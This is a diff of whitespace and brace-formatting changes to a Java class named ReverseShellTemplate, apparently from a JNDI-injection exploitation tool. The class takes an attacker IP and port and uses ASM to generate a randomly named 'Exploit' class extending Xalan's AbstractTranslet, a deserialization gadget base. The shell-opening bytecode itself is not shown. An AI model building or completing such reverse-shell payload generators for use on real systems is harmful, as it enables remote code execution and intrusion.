@@ -3,20 +3,21 @@ package com.qi4l.jndi.template;
 import com.qi4l.jndi.gadgets.utils.Cache;
 import com.qi4l.jndi.gadgets.utils.Util;
 import org.objectweb.asm.*;
+
 import static org.objectweb.asm.Opcodes.*;
 
 public class ReverseShellTemplate implements Template {
     private String className;
     private byte[] bytes;
     private String ip;
-    private int port;
+    private int    port;
 
-    public ReverseShellTemplate(String ip, String port){
+    public ReverseShellTemplate(String ip, String port) {
         this(ip, Integer.parseInt(port));
     }
 
 
-    public ReverseShellTemplate(String ip, int port){
+    public ReverseShellTemplate(String ip, int port) {
         this.ip = ip;
         this.port = port;
         this.className = "Exploit" + Util.getRandomString();
@@ -24,7 +25,7 @@ public class ReverseShellTemplate implements Template {
         generate();
     }
 
-    public ReverseShellTemplate(String ip, String port, String className){
+    public ReverseShellTemplate(String ip, String port, String className) {
         this(ip, Integer.parseInt(port));
         this.className = className;
 
@@ -32,7 +33,7 @@ public class ReverseShellTemplate implements Template {
     }
 
     @Override
-    public String getClassName(){
+    public String getClassName() {
         return className;
     }
 
@@ -48,9 +49,9 @@ public class ReverseShellTemplate implements Template {
 
     @Override
     public void generate() {
-        ClassWriter cw = new ClassWriter(0);
-        FieldVisitor fv;
-        MethodVisitor mv;
+        ClassWriter       cw = new ClassWriter(0);
+        FieldVisitor      fv;
+        MethodVisitor     mv;
         AnnotationVisitor av0;
 
         cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);
